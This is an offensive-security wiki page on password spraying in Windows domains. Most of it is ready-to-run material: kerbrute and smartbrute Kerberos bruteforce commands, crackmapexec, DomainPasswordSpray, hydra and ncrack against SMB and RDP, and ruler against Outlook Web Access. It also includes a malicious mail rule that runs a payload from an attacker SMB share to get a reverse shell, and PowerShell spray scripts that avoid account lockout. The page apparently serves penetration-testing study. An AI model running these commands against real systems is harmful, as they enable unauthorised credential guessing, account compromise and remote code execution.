---
description: >-
  Password spraying refers to the attack method that takes a large number of
  usernames and loops them with a single password.
---

# Password spraying

{% hint style="info" %}
The builtin Administrator account (RID:500) cannot be locked out of the system no matter how many failed logon attempts it accumulates.
{% endhint %}

## <mark style="color:red;">**Kerberos pre-auth bruteforcing**</mark>

The Kerberos authentication protocol works with tickets in order to grant access. A ST (Service Ticket) can be obtained by presenting a TGT (Ticket Granting Ticket). That prior TGT can only be obtained by validating a first step named "pre-authentication".

The pre-authentication requires the requesting user to supply its secret key (DES, RC4, AES128 or AES256) derived from his password. An attacker knowing that secret key doesn't need knowledge of the actual password to obtain tickets. This is called [pass-the-key](https://www.thehacker.recipes/ad-ds/movement/kerberos/pass-the-key).

Sometimes, the pre-authentication is disabled on some accounts. The attacker can then obtain information encrypted with the account's key. While the obtained TGT cannot be used since it's encrypted with a key the attacker has no knowledge of, the encrypted information can be used to bruteforce the account's password. This is called [ASREProast](https://www.thehacker.recipes/ad-ds/movement/kerberos/asreproast).

Last but not least, the pre-authentication step can be bruteforced. This type of [credential bruteforcing](https://www.thehacker.recipes/ad-ds/movement/credentials/bruteforcing) is way faster and stealthier than other bruteforcing methods relying on NTLM. Pre-authentication bruteforcing can even be faster by using UDP as the transport protocol, hence requiring less frames to be sent.

{% hint style="info" %}
Kerberos pre-authentication errors are not logged in Active Directory with a normal **Logon failure event (4625)**, but rather with specific logs to **Kerberos pre-authentication failure (4771)**.
{% endhint %}

{% embed url="https://github.com/ropnop/kerbrute" %}

### <mark style="color:orange;">Username bruteforce</mark>

```
 ./kerbrute_linux_amd64 userenum -d domain.local --dc 10.10.10.10 usernames.txt
```

### <mark style="color:orange;">Password bruteforce</mark>

```
./kerbrute_linux_amd64 bruteuser -d domain.local --dc 10.10.10.10 rockyou.txt username
```

### <mark style="color:orange;">Password spray</mark>

```
root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt Password123
root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt rockyou.txt
root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt '123456' -v --delay 100 -o kerbrute-passwordspray-123456.log
```

[smartbrute](https://github.com/ShutdownRepo/smartbrute) (Python) can be used to bruteforce credentials through the Kerberos pre-authentication. The smartbrute utility can be used in a `brute` mode (standard bruteforcing features) or in a `smart` mode (requires prior knowledge of a low-priv user credentials, but operates LDAP enumeration and avoid locking out accounts, fetches the users list and so on).

```
# brute mode, users and passwords lists supplied
smartbrute.py brute -bU $USER_LIST -bP $PASSWORD_LIST kerberos -d $DOMAIN
​
# smart mode, valid credentials supplied for enumeration
smartbrute.py smart -bP $PASSWORD_LIST ntlm -d $DOMAIN -u $USER -p $PASSWORD kerberos
```

### **​​**<mark style="color:orange;">**Spray a pre-generated passwords list**</mark>

Using `crackmapexec` and `mp64` to generate passwords and spray them against SMB services on the network.

```
crackmapexec smb 10.0.0.1/24 -u Administrator -p `(./mp64.bin Pass@wor?l?a)`
```

Using `DomainPasswordSpray` to spray a password against all users of a domain.

```
# https://github.com/dafthack/DomainPasswordSpray
Invoke-DomainPasswordSpray -Password Summer2021!
# /!\ be careful with the account lockout !
Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt
```

Using `SMBAutoBrute`.

```
Invoke-SMBAutoBrute -UserList "C:\ProgramData\admins.txt" -PasswordList "Password1, Welcome1, 1qazXDR%+" -LockoutThreshold 5 -ShowVerbose
```

## <mark style="color:red;">**RDP**</mark>

Using RDPassSpray to target RDP services.

```
git clone https://github.com/xFreed0m/RDPassSpray
python3 RDPassSpray.py -u [USERNAME] -p [PASSWORD] -d [DOMAIN] -t [TARGET IP]
```

Using hydra and ncrack to target RDP services.

```
hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.10
ncrack –connection-limit 1 -vv --user administrator -P password-file.txt rdp://10.10.10.10
```

## <mark style="color:red;">SMB</mark>

```
$ crackmapexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --users
LDAP        10.0.2.11       389    dc01       Guest      badpwdcount: 0 pwdLastSet: <never>
LDAP        10.0.2.11       389    dc01       krbtgt     badpwdcount: 0 pwdLastSet: <never>
```

## <mark style="color:red;">Outlook Web Access</mark>

password spray against an Exchange 2016 server in a offense.local domain:

```
ruler -k --domain offense.local brute --users users --passwords passwords --verbose
```

if you are attempting to replicate this technique in your own labs, you may need to update your /etc/hosts to point to your Exchange server.

If the password spray against an Exchange server was successful and you have obtained valid credentials, you can now leverage Ruler to create a malicious email rule to that will gain you remote code execution on the host that checks that compromised mailbox.

validate the compromised credentials are working by checking if there are any email rules created already:

```
ruler -k --verbose --email spotless@offense.local -u spotless -p 123456  display
```

The below suggests the credentials are working and that no mail rules are set for this account yet:

![](<../../.gitbook/assets/image (6) (1) (1).png>)

### <mark style="color:orange;">Get a Shell with Malicious Rules</mark>

we can use this technique to get a reverse shell:

```
#payload path:
/root/tools/evilm64.exe

# smb share and server:
smbserver.py tools /root/tools/

# setup your listener and run ruler to create a malicious email rule:
ruler -k --verbose --email spotless@offense.local --username spotless -p 123456  add --location '\\10.0.0.5\tools\\evilm64.exe' --trigger "popashell" --name maliciousrule --send --subject popashell
```

If you want to delete the malicious email rule, do this:

```
ruler -k --verbose --email spotless@offense.local --username spotless -p 123456 delete --name maliciousrule
```

## <mark style="color:red;">MSSQL</mark>

```
use admin/mssql/mssql_enum_sql_logins
```

### <mark style="color:red;">**BadPwdCount attribute**</mark>

{% hint style="info" %}
The number of times the user tried to log on to the account using an incorrect password. A value of 0 indicates that the value is unknown.
{% endhint %}

```
$ crackmapexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --users
LDAP        10.0.2.11       389    dc01       Guest      badpwdcount: 0 pwdLastSet: <never>
LDAP        10.0.2.11       389    dc01       krbtgt     badpwdcount: 0 pwdLastSet: <never>
```

## <mark style="color:red;">Invoke-DomainSpray</mark> <a href="#invoke-domainspray" id="invoke-domainspray"></a>

```
Get-ADUser -Properties name -Filter * | Select-Object -ExpandProperty name |  Out-File users.txt
type users.txt
```

```
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```

## <mark style="color:red;">Spraying using dsacls</mark> <a href="#spraying-using-dsacls" id="spraying-using-dsacls"></a>

```
$domain = ((cmd /c set u)[-3] -split "=")[-1]
$pdc = ((nltest.exe /dcname:$domain) -split "\\\\")[1]
$lockoutBadPwdCount = ((net accounts /domain)[7] -split ":" -replace " ","")[1]
$password = "123456"

# (Get-Content users.txt)
"krbtgt","spotless" | % {
    $badPwdCount = Get-ADObject -SearchBase "cn=$_,cn=users,dc=$domain,dc=local" -Filter * -Properties badpwdcount -Server $pdc | Select-Object -ExpandProperty badpwdcount
    if ($badPwdCount -lt $lockoutBadPwdCount - 3) {
        $isInvalid = dsacls.exe "cn=domain admins,cn=users,dc=offense,dc=local" /user:$_@offense.local /passwd:$password | select-string -pattern "Invalid Credentials"
        if ($isInvalid -match "Invalid") {
            Write-Host "[-] Invalid Credentials for $_ : $password" -foreground red
        } else {
            Write-Host "[+] Working Credentials for $_ : $password" -foreground green
        }        
    }
}
```

## <mark style="color:red;">Spraying with Start-Process</mark> <a href="#spraying-with-start-process" id="spraying-with-start-process"></a>

Similarly to dsacls, it's possible to spray passwords with `Start-Process` cmdlet and the help of PowerView's cmdlets:

```
# will spray only users that currently have 0 bad password attempts
# dependency - powerview

function Get-BadPasswordCount {
    param(
        $username = "username",
        $domain = "offense.local"
    )
    $pdc = (get-netdomain -domain $domain).PdcRoleOwner
    $badPwdCount = (Get-NetUser $username -Domain $domain -DomainController $pdc.name).badpwdcount
    return $badPwdCount
}

$users = Get-netuser -properties samaccountname | Select-Object -ExpandProperty samaccountname
$domain = "offense.local"
$password = "123456"

Write-Host $users.Count users supplied; $users | % {
    $badPasswordCount = Get-BadPasswordCount -username $_ -Domain $domain
    if ($badPasswordCount -lt 0) {
        Write-Host Spraying : -NoNewline; Write-host -ForegroundColor Green " $_"
        $credentials = New-Object System.Management.Automation.PSCredential -ArgumentList @("$domain\$_",(ConvertTo-SecureString -String $password -AsPlainText -Force))
        Start-Process cmd -Credential ($credentials)
    } else {
        Write-Host "Ignoring $_ with $badPasswordCount badPwdCount" -ForegroundColor Red
    }
}
```
